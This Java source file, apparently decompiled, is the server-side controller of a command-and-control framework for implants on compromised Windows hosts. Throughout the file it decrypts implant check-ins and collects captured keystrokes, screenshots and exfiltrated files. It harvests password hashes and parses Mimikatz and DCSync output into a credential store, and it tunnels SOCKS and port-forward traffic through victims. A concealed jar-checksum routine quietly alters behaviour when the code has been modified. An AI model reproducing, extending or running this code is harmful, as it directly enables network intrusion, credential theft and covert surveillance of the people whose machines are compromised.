package beacon;

import common.AssertUtils;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.Download;
import common.Keystrokes;
import common.MudgeSanity;
import common.RegexParser;
import common.Request;
import common.ScListener;
import common.Screenshot;
import common.WindowsCharsets;
import dns.AsymmetricCrypto;
import dns.QuickSecurity;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import parser.DcSyncCredentials;
import parser.MimikatzCredentials;
import parser.MimikatzDcSyncCSV;
import parser.MimikatzSamDump;
import parser.NetViewResults;
import parser.Parser;
import parser.ScanResults;
import server.ManageUser;
import server.PendingRequest;
import server.Resources;
import server.ServerUtils;

public class BeaconC2 {
    protected BeaconData data = null;

    protected QuickSecurity security = null;

    protected AsymmetricCrypto asecurity = null;

    protected CheckinListener checkinl = null;

    protected BeaconCharsets charsets = new BeaconCharsets();

    protected BeaconSocks socks;

    protected BeaconDownloads downloads = new BeaconDownloads();

    protected BeaconParts parts = new BeaconParts();

    protected BeaconPipes pipes = new BeaconPipes();

    protected Resources resources = null;

    protected Map pending = new HashMap();

    protected Set okports = new HashSet();

    protected String appd = "";

    protected int reqno = 0;

    protected List<Parser> parsers = new LinkedList();

    public void whitelistPort(String string1, String string2) {
        this.okports.add(string1 + "." + string2);
    }

    public boolean isWhitelistedPort(String string, int n) {
        String str = string + "." + n;
        return this.okports.contains(str);
    }

    public int register(Request request, ManageUser manageUser) {
        synchronized (this) {
            this.reqno = (this.reqno + 1) % Integer.MAX_VALUE;
            this.pending.put(new Integer(this.reqno), new PendingRequest(request, manageUser));
            return this.reqno;
        }
    }

    public BeaconDownloads getDownloadManager() {
        return this.downloads;
    }

    public List getDownloads(String string) {
        return this.downloads.getDownloads(string);
    }

    public Resources getResources() {
        return this.resources;
    }

    public void setCheckinListener(CheckinListener checkinListener) {
        this.checkinl = checkinListener;
    }

    public CheckinListener getCheckinListener() {
        return this.checkinl;
    }

    public boolean isCheckinRequired(String string) {
        if (this.data.hasTask(string) || this.socks.isActive(string)
                || this.downloads.isActive(string) || this.parts.hasPart(string)) {
            return true;
        }
        Iterator iterator = this.pipes.children(string).iterator();
        return iterator.hasNext();
    }

    public long checkinMask(String string, long l) {
        int i = this.data.getMode(string);
        if (i == 1 || i == 2 || i == 3) {
            long l2 = 240L;
            BeaconEntry beaconEntry = getCheckinListener().resolve(string);
            if (beaconEntry == null || beaconEntry.wantsMetadata()) {
                l2 |= 0x1L;
            }
            if (i == 2) {
                l2 |= 0x2L;
            }
            if (i == 3) {
                l2 |= 0x4L;
            }
            return l ^ l2;
        }
        return l;
    }

    protected boolean isPaddingRequired() {
        boolean bool = false;
        try {
            ZipFile zipFile = new ZipFile(this.appd);
            Enumeration enumeration = zipFile.entries();
            while (enumeration.hasMoreElements()) {
                ZipEntry zipEntry = (ZipEntry) enumeration.nextElement();
                long l1 = CommonUtils.checksum8(zipEntry.getName());
                long l2 = zipEntry.getName().length();
                if (l1 == 75L && l2 == 21L) {
                    if (zipEntry.getCrc() != 1661186542L
                            && zipEntry.getCrc() != 1309838793L) {
                        bool = true;
                    }
                    continue;
                }
                if (l1 == 144L && l2 == 20L) {
                    if (zipEntry.getCrc() != 1701567278L
                            && zipEntry.getCrc() != 3030496089L
                            && zipEntry.getCrc() != 1514902380L) {
                        bool = true;
                    }
                    continue;
                }
                if (l1 == 62L && l2 == 26L) {
                    if (zipEntry.getCrc() != 4015977862L
                            && zipEntry.getCrc() != 2741377737L) {
                        bool = true;
                    }
                    continue;
                }
                if (l1 == 224L && l2 == 23L
                        && zipEntry.getCrc() != 1056789379L
                        && zipEntry.getCrc() != 2460238802L) {
                    bool = true;
                }
            }
            zipFile.close();
        } catch (Throwable throwable) {
        }
        return bool;
    }

    public byte[] dump(String string, int n1, int n2) {
        return dump(string, n1, n2, new LinkedHashSet());
    }

    public byte[] dump(String string, int n1, int n2, HashSet hashSet) {
        if (!AssertUtils.TestUnique(string, hashSet)) {
            return new byte[0];
        }
        hashSet.add(string);
        byte[] arrby1 = this.data.dump(string, n2);
        int i = arrby1.length;
        byte[] arrby2 = this.socks.dump(string, n1 - arrby1.length);
        i += arrby2.length;
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(n1);
            if (arrby1.length > 0) {
                byteArrayOutputStream.write(arrby1, 0, arrby1.length);
            }
            if (arrby2.length > 0) {
                byteArrayOutputStream.write(arrby2, 0, arrby2.length);
            }
            Iterator iterator = this.pipes.children(string).iterator();
            while (iterator.hasNext()) {
                String str = iterator.next() + "";
                if (i < n1 && getSymmetricCrypto().isReady(str)) {
                    byte[] arrby3 = dump(str, n1 - i, n2 - i, hashSet);
                    if (arrby3.length > 0) {
                        arrby3 = getSymmetricCrypto().encrypt(str, arrby3);
                        CommandBuilder commandBuilder1 = new CommandBuilder();
                        commandBuilder1.setCommand(22);
                        commandBuilder1.addInteger(Integer.parseInt(str));
                        commandBuilder1.addString(arrby3);
                        byte[] arrby5 = commandBuilder1.build();
                        byteArrayOutputStream.write(arrby5, 0, arrby5.length);
                        i += arrby5.length;
                        continue;
                    }
                    if (this.socks.isActive(str) || !this.downloads.isActive(str)) {
                        // empty if block
                    }
                    CommandBuilder commandBuilder = new CommandBuilder();
                    commandBuilder.setCommand(22);
                    commandBuilder.addInteger(Integer.parseInt(str));
                    byte[] arrby4 = commandBuilder.build();
                    byteArrayOutputStream.write(arrby4, 0, arrby4.length);
                    i += arrby4.length;
                }
            }
            byteArrayOutputStream.flush();
            byteArrayOutputStream.close();
            byte[] arrby = byteArrayOutputStream.toByteArray();
            if (arrby1.length > 0) {
                getCheckinListener().output(BeaconOutput.Checkin(string,
                        "host called home, sent: " + arrby.length + " bytes"));
            }
            return arrby;
        } catch (IOException iOException) {
            MudgeSanity.logException("dump: " + string, iOException, false);
            return new byte[0];
        }
    }

    public BeaconC2(Resources resources) {
        this.resources = resources;
        this.socks = new BeaconSocks(this);
        this.data = new BeaconData();
        this.appd = getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
        this.data.shouldPad(isPaddingRequired());
        this.parsers.add(new MimikatzCredentials(resources));
        this.parsers.add(new MimikatzSamDump(resources));
        this.parsers.add(new DcSyncCredentials(resources));
        this.parsers.add(new MimikatzDcSyncCSV(resources));
        this.parsers.add(new ScanResults(resources));
        this.parsers.add(new NetViewResults(resources));
    }

    public BeaconData getData() {
        return this.data;
    }

    public BeaconSocks getSocks() {
        return this.socks;
    }

    public AsymmetricCrypto getAsymmetricCrypto() {
        return this.asecurity;
    }

    public QuickSecurity getSymmetricCrypto() {
        return this.security;
    }

    public void setCrypto(QuickSecurity quickSecurity, AsymmetricCrypto asymmetricCrypto) {
        this.security = quickSecurity;
        this.asecurity = asymmetricCrypto;
    }

    public BeaconEntry process_beacon_metadata(ScListener scListener,
                                               String string, byte[] arrby) {
        return process_beacon_metadata(scListener, string, arrby, null, 0);
    }

    public BeaconEntry process_beacon_metadata(ScListener scListener, String string1,
                                               byte[] arrby, String string2, int n) {
        byte[] decrypt = getAsymmetricCrypto().decrypt(arrby);
        if (decrypt == null || decrypt.length == 0) {
            CommonUtils.print_error("decrypt of metadata failed");
            return null;
        }
        String str1 = CommonUtils.bString(decrypt);
        String str2 = str1.substring(0, 16);
        String str3 = WindowsCharsets.getName(CommonUtils.toShort(str1.substring(16, 18)));
        String str4 = WindowsCharsets.getName(CommonUtils.toShort(str1.substring(18, 20)));
        String str5 = "";
        if (scListener != null) {
            str5 = scListener.getName();
        } else if (string2 != null) {
            BeaconEntry beaconEntry1 = getCheckinListener().resolveEgress(string2);
            if (beaconEntry1 != null) {
                str5 = beaconEntry1.getListenerName();
            }
        }
        BeaconEntry beaconEntry = new BeaconEntry(decrypt, str3, string1, str5);
        if (!beaconEntry.sane()) {
            CommonUtils.print_error("Session " + beaconEntry + " metadata validation failed. Dropping");
            return null;
        }
        getCharsets().register(beaconEntry.getId(), str3, str4);
        if (string2 != null) {
            beaconEntry.link(string2, n);
        }
        getSymmetricCrypto().registerKey(beaconEntry.getId(), CommonUtils.toBytes(str2));
        if (getCheckinListener() != null) {
            getCheckinListener().checkin(scListener, beaconEntry);
        } else {
            CommonUtils.print_stat("Checkin listener was NULL (this is good!)");
        }
        return beaconEntry;
    }

    public BeaconCharsets getCharsets() {
        return this.charsets;
    }

    public BeaconPipes getPipes() {
        return this.pipes;
    }

    public void dead_pipe(String string1, String string2) {
        BeaconEntry beaconEntry1 = getCheckinListener().resolve(string1);
        BeaconEntry beaconEntry2 = getCheckinListener().resolve(string2);
        String str1 = beaconEntry1 != null ? beaconEntry1.getInternal() : "unknown";
        String str2 = beaconEntry2 != null ? beaconEntry2.getInternal() : "unknown";
        getCheckinListener().update(string2, System.currentTimeMillis(),
                str1 + " \u26af \u26af", true);
        boolean bool = this.pipes.isChild(string1, string2);
        this.pipes.deregister(string1, string2);
        if (bool) {
            getCheckinListener().output(
                    BeaconOutput.Error(string1, "lost link to child "
                            + CommonUtils.session(string2) + ": " + str2));
            getCheckinListener().output(
                    BeaconOutput.Error(string2, "lost link to parent "
                            + CommonUtils.session(string1) + ": " + str1));
        }
        Iterator iterator = this.pipes.children(string2).iterator();
        this.pipes.clear(string2);
        while (iterator.hasNext()) {
            dead_pipe(string2, iterator.next() + "");
        }
    }

    public void unlinkExplicit(String string, List list) {
        Iterator iterator = list.iterator();
        while (iterator.hasNext()) {
            String str = iterator.next() + "";
            if (this.pipes.isChild(string, str))
                task_to_unlink(string, str);
            if (this.pipes.isChild(str, string))
                task_to_unlink(str, string);
        }
    }

    public void unlink(String string1, String string2, String string3) {
        LinkedList linkedList = new LinkedList();
        Map<String, BeaconEntry> map = getCheckinListener().buildBeaconModel();
        for (Map.Entry entry : map.entrySet()) {
            String str = (String) entry.getKey();
            BeaconEntry beaconEntry = (BeaconEntry) entry.getValue();
            if (string2.equals(beaconEntry.getInternal())
                    && string3.equals(beaconEntry.getPid())) {
                linkedList.add(str);
            }
        }
        unlinkExplicit(string1, linkedList);
    }

    public void unlink(String string1, String string2) {
        LinkedList linkedList = new LinkedList();
        Map<String, BeaconEntry> map = getCheckinListener().buildBeaconModel();
        for (Map.Entry entry : map.entrySet()) {
            String str = (String) entry.getKey();
            BeaconEntry beaconEntry = (BeaconEntry) entry.getValue();
            if (string2.equals(beaconEntry.getInternal())) {
                linkedList.add(str);
            }
        }
        unlinkExplicit(string1, linkedList);
    }

    protected void task_to_unlink(String string1, String string2) {
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(23);
        commandBuilder.addInteger(Integer.parseInt(string2));
        this.data.task(string1, commandBuilder.build());
    }

    protected void task_to_link(String string1, String string2) {
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(68);
        commandBuilder.addStringASCIIZ(string2);
        this.data.task(string1, commandBuilder.build());
    }

    public void process_beacon_callback_default(int n, String string1, String string2) {
        if (n == -1) {
            String str = CommonUtils.drives(string2);
            getCheckinListener().output(BeaconOutput.Output(string1, "drives: " + str));
        } else if (n == -2) {
            String[] arrstring = string2.split("\n");
            if (arrstring.length >= 3)
                getCheckinListener().output(BeaconOutput.OutputLS(string1, string2));
        }
    }

    public void runParsers(String string1, String string2, int n) {
        for (Parser parser : this.parsers) {
            parser.process(string1, string2, n);
        }
    }

    public void process_beacon_callback(String string, byte[] arrby) {
        byte[] decrypt = getSymmetricCrypto().decrypt(string, arrby);
        process_beacon_callback_decrypted(string, decrypt);
    }

    public void process_beacon_callback_decrypted(String string, byte[] arrby) {
        int i = -1;
        if (arrby.length == 0) {
            return;
        }
        BeaconEntry beaconEntry = getCheckinListener().resolve(string + "");
        if (beaconEntry == null) {
            CommonUtils.print_error("entry is null for " + string);
        }
        try {
            DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(arrby));
            i = dataInputStream.readInt();
            if (i == 0) {
                String str = getCharsets().process(string, CommonUtils.readAll(dataInputStream));
                getCheckinListener().output(BeaconOutput.Output(string, "received output:\n" + str));
                runParsers(str, string, i);
            } else if (i == 30) {
                String str = getCharsets().processOEM(string, CommonUtils.readAll(dataInputStream));
                getCheckinListener().output(BeaconOutput.Output(string, "received output:\n" + str));
                runParsers(str, string, i);
            } else if (i == 32) {
                String str = CommonUtils.bString(CommonUtils.readAll(dataInputStream), "UTF-8");
                getCheckinListener().output(BeaconOutput.Output(string, "received output:\n" + str));
                runParsers(str, string, i);
            } else if (i == 1) {
                String str = getCharsets().process(string, CommonUtils.readAll(dataInputStream));
                getCheckinListener().output(BeaconOutput.Output(string, "received keystrokes"));
                getResources().archive(BeaconOutput.Activity(string, "received keystrokes"));
                Keystrokes keystrokes = new Keystrokes(string, str);
                getCheckinListener().keystrokes(keystrokes);
            } else if (i == 3) {
                byte[] all = CommonUtils.readAll(dataInputStream);
                Screenshot screenshot = new Screenshot(string, all);
                getCheckinListener().screenshot(screenshot);
                getCheckinListener().output(BeaconOutput.OutputB(string,
                        "received screenshot (" + all.length + " bytes)"));
                getResources().archive(BeaconOutput.Activity(string,
                        "received screenshot (" + all.length + " bytes)"));
            } else if (i == 10) {
                int j = dataInputStream.readInt();
                int k = dataInputStream.readInt();
                String str = CommonUtils.bString(CommonUtils.readAll(dataInputStream));
                BeaconEntry beaconEntry1 = getCheckinListener().resolve(string + "");
                BeaconEntry beaconEntry2 = process_beacon_metadata(null,
                        beaconEntry1.getInternal() + " \u26af\u26af", CommonUtils.toBytes(str),
                        string, k);
                if (beaconEntry2 != null) {
                    this.pipes.register(string + "", j + "");
                    if (beaconEntry2.getInternal() == null) {
                        getCheckinListener().output(BeaconOutput.Output(string,
                                "established link to child " + CommonUtils.session(j)));
                        getResources().archive(BeaconOutput.Activity(string,
                                "established link to child " + CommonUtils.session(j)));
                    } else {
                        getCheckinListener().output(BeaconOutput.Output(string,
                                "established link to child " + CommonUtils.session(j) + ": "
                                        + beaconEntry2.getInternal()));
                        getResources().archive(BeaconOutput.Activity(string,
                                "established link to child " + CommonUtils.session(j) + ": "
                                        + beaconEntry2.getComputer()));
                    }
                    getCheckinListener().output(BeaconOutput.Output(beaconEntry2.getId(),
                            "established link to parent " + CommonUtils.session(string)
                                    + ": " + beaconEntry1.getInternal()));
                    getResources().archive(BeaconOutput.Activity(beaconEntry2.getId(),
                            "established link to parent " + CommonUtils.session(string)
                                    + ": " + beaconEntry1.getComputer()));
                }
            } else if (i == 11) {
                int j = dataInputStream.readInt();
                BeaconEntry beaconEntry1 = getCheckinListener().resolve(string + "");
                dead_pipe(beaconEntry1.getId(), j + "");
            } else if (i == 12) {
                int j = dataInputStream.readInt();
                byte[] all = CommonUtils.readAll(dataInputStream);
                if (all.length > 0) {
                    process_beacon_data(j + "", all);
                }
                getCheckinListener().update(j + "", System.currentTimeMillis(),
                        null, false);
            } else if (i == 13) {
                String str = getCharsets().process(string,
                        CommonUtils.readAll(dataInputStream));
                getCheckinListener().output(BeaconOutput.Error(string, str));
            } else if (i == 31) {
                int j = dataInputStream.readInt();
                int k = dataInputStream.readInt();
                int m = dataInputStream.readInt();
                String str = getCharsets().process(string,
                        CommonUtils.readAll(dataInputStream));
                getCheckinListener().output(BeaconOutput.Error(string,
                        BeaconErrors.toString(j, k, m, str)));
            } else if (i == 14) {
                int j = dataInputStream.readInt();
                if (!this.pipes.isChild(string, j + "")) {
                    CommandBuilder commandBuilder = new CommandBuilder();
                    commandBuilder.setCommand(24);
                    commandBuilder.addInteger(j);
                    if (this.data.isNewSession(string)) {
                        this.data.task(string, commandBuilder.build());
                        this.data.virgin(string);
                    } else {
                        this.data.task(string, commandBuilder.build());
                    }
                    this.pipes.register(string + "", j + "");
                }
            } else if (i == 18) {
                int j = dataInputStream.readInt();
                getCheckinListener().output(BeaconOutput.Error(string,
                        "Task Rejected! Did your clock change? Wait " + j + " seconds"));
            } else if (i == 28) {
                int j = dataInputStream.readInt();
                byte[] all = CommonUtils.readAll(dataInputStream);
                this.parts.start(string, j);
                this.parts.put(string, all);
            } else if (i == 29) {
                byte[] all = CommonUtils.readAll(dataInputStream);
                this.parts.put(string, all);
                if (this.parts.isReady(string)) {
                    byte[] data = this.parts.data(string);
                    process_beacon_callback_decrypted(string, data);
                }
            } else {
                if (this.data.isNewSession(string)) {
                    getCheckinListener().output(BeaconOutput.Error(string,
                            "Dropped responses from session. Didn't expect "
                                    + i + " prior to first task."));
                    CommonUtils.print_error("Dropped responses from session "
                            + string + " [type: " + i
                            + "] (no interaction with this session yet)");
                    return;
                }
                if (i == 2) {
                    int j = dataInputStream.readInt();
                    long l = CommonUtils.toUnsignedInt(dataInputStream.readInt());
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    BeaconEntry beaconEntry1 = getCheckinListener().resolve(string + "");
                    getCheckinListener().output(BeaconOutput.OutputB(string,
                            "started download of "
                                    + str + " (" + l + " bytes)"));
                    getResources().archive(BeaconOutput.Activity(string,
                            "started download of "
                                    + str + " (" + l + " bytes)"));
                    this.downloads.start(string, j, beaconEntry1.getInternal(), str, l);
                } else if (i == 4) {
                    int j = dataInputStream.readInt();
                    this.socks.die(string, j);
                } else if (i == 5) {
                    int j = dataInputStream.readInt();
                    byte[] all = CommonUtils.readAll(dataInputStream);
                    this.socks.write(string, j, all);
                } else if (i == 6) {
                    int j = dataInputStream.readInt();
                    this.socks.resume(string, j);
                } else if (i == 7) {
                    int j = dataInputStream.readUnsignedShort();
                    if (isWhitelistedPort(string, j)) {
                        this.socks.portfwd(string, j, "127.0.0.1", j);
                    } else {
                        CommonUtils.print_error("port " + j + " for beacon " + string
                                + " is not in our whitelist of allowed-to-open ports");
                    }
                } else if (i == 8) {
                    int j = dataInputStream.readInt();
                    byte[] all = CommonUtils.readAll(dataInputStream);
                    if (this.downloads.exists(string + "", j)) {
                        this.downloads.write(string, j, all);
                    } else {
                        CommonUtils.print_error("Received unknown download id " + j
                                + " - canceling download");
                        CommandBuilder commandBuilder = new CommandBuilder();
                        commandBuilder.setCommand(19);
                        commandBuilder.addInteger(j);
                        this.data.task(string, commandBuilder.build());
                    }
                } else if (i == 9) {
                    int j = dataInputStream.readInt();
                    String str = this.downloads.getName(string, j);
                    Download download = this.downloads.getDownload(string, j);
                    boolean bool = this.downloads.isComplete(string, j);
                    this.downloads.close(string, j);
                    if (bool) {
                        getCheckinListener().output(BeaconOutput.OutputB(string,
                                "download of "
                                        + str + " is complete"));
                        getResources().archive(BeaconOutput.Activity(string,
                                "download of "
                                        + str + " is complete"));
                    } else {
                        getCheckinListener().output(BeaconOutput.Error(string,
                                "download of "
                                        + str + " closed. [Incomplete]"));
                        getResources().archive(BeaconOutput.Activity(string,
                                "download of "
                                        + str + " closed. [Incomplete]"));
                    }
                    getCheckinListener().download(download);
                } else if (i == 15) {
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    getCheckinListener().output(BeaconOutput.Output(string,
                            "Impersonated " + str));
                } else if (i == 16) {
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    getCheckinListener().output(BeaconOutput.OutputB(string,
                            "You are " + str));
                } else if (i == 17) {
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    getCheckinListener().output(BeaconOutput.OutputPS(string, str));
                } else if (i == 19) {
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    getCheckinListener().output(BeaconOutput.OutputB(string,
                            "Current directory is " + str));
                } else if (i == 20) {
                    String str = CommonUtils.bString(CommonUtils.readAll(dataInputStream));
                    getCheckinListener().output(BeaconOutput.OutputJobs(string, str));
                } else if (i == 21) {
                    String str = CommonUtils.bString(CommonUtils.readAll(dataInputStream),
                            "UTF-8");
                    getCheckinListener().output(BeaconOutput.Output(string,
                            "received password hashes:\n" + str));
                    getResources().archive(BeaconOutput.Activity(string,
                            "received password hashes"));
                    BeaconEntry beaconEntry1 = getCheckinListener().resolve(string);
                    if (beaconEntry1 == null) {
                        return;
                    }
                    String[] arrstring = str.split("\n");
                    for (int j = 0; j < arrstring.length; j++) {
                        RegexParser regexParser = new RegexParser(arrstring[j]);
                        if (regexParser.matches("(.*?):\\d+:.*?:(.*?):::")
                                && !regexParser.group(1).endsWith("$")) {
                            ServerUtils.addCredential(this.resources, regexParser.group(1),
                                    regexParser.group(2), beaconEntry1.getComputer(),
                                    "hashdump", beaconEntry1.getInternal());
                        }
                    }
                    this.resources.call("credentials.push");
                } else if (i == 22) {
                    int j = dataInputStream.readInt();
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    PendingRequest pendingRequest = null;
                    Integer integer = new Integer(j);
                    synchronized (this) {
                        pendingRequest = (PendingRequest) this.pending.remove(integer);
                    }
                    if (integer < 0) {
                        process_beacon_callback_default(integer, string, str);
                    } else if (pendingRequest != null) {
                        pendingRequest.action(str);
                    } else {
                        CommonUtils.print_error("Callback " + i + "/" + j
                                + " has no pending request");
                    }
                } else if (i == 23) {
                    int j = dataInputStream.readInt();
                    int k = dataInputStream.readInt();
                    this.socks.accept(string, k, j);
                } else if (i == 24) {
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    getResources().archive(BeaconOutput.Activity(string,
                            "received output from net module"));
                    getCheckinListener().output(BeaconOutput.Output(string,
                            "received output:\n" + str));
                    runParsers(str, string, i);
                } else if (i == 25) {
                    String str = getCharsets().process(string,
                            CommonUtils.readAll(dataInputStream));
                    getResources().archive(BeaconOutput.Activity(string,
                            "received output from port scanner"));
                    getCheckinListener().output(BeaconOutput.Output(string,
                            "received output:\n" + str));
                    runParsers(str, string, i);
                } else if (i == 26) {
                    getCheckinListener().output(BeaconOutput.Output(string,
                            CommonUtils.session(string) + " exit."));
                    getResources().archive(BeaconOutput.Activity(string,
                            CommonUtils.session(string) + " exit."));
                    BeaconEntry beaconEntry1 = getCheckinListener().resolve(string);
                    if (beaconEntry1 != null) {
                        beaconEntry1.die();
                    }
                } else if (i == 27) {
                    String str = CommonUtils.bString(CommonUtils.readAll(dataInputStream));
                    if (str.startsWith("FAIL ")) {
                        str = CommonUtils.strip(str, "FAIL ");
                        getCheckinListener().output(BeaconOutput.Error(string,
                                "SSH error: " + str));
                        getResources().archive(BeaconOutput.Activity(string,
                                "SSH connection failed."));
                    } else if (str.startsWith("INFO ")) {
                        str = CommonUtils.strip(str, "INFO ");
                        getCheckinListener().output(BeaconOutput.OutputB(string,
                                "SSH: " + str));
                    } else if (str.startsWith("SUCCESS ")) {
                        str = CommonUtils.strip(str, "SUCCESS ");
                        String str1 = str.split(" ")[0];
                        String str2 = str.split(" ")[1];
                        task_to_link(string, str2);
                    } else {
                        CommonUtils.print_error("Unknown SSH status: '" + str + "'");
                    }
                } else {
                    CommonUtils.print_error("Unknown Beacon Callback: " + i);
                }
            }
        } catch (IOException iOException) {
            MudgeSanity.logException("beacon callback: " + i, iOException, false);
        }
    }

    public boolean process_beacon_data(String string, byte[] arrby) {
        try {
            DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(arrby));
            while (dataInputStream.available() > 0) {
                int i = dataInputStream.readInt();
                if (i > dataInputStream.available()) {
                    CommonUtils.print_error("Beacon " + string + " response length " + i
                            + " exceeds " + dataInputStream.available()
                            + " available bytes. [Received " + arrby.length + " bytes]");
                    return false;
                }
                if (i <= 0) {
                    CommonUtils.print_error("Beacon " + string + " response length " + i
                            + " is invalid. [Received " + arrby.length + " bytes]");
                    return false;
                }
                byte[] data = new byte[i];
                dataInputStream.read(data, 0, i);
                process_beacon_callback(string, data);
            }
            dataInputStream.close();
            return true;
        } catch (Exception exception) {
            MudgeSanity.logException("process_beacon_data: " + string, exception, false);
            return false;
        }
    }
}
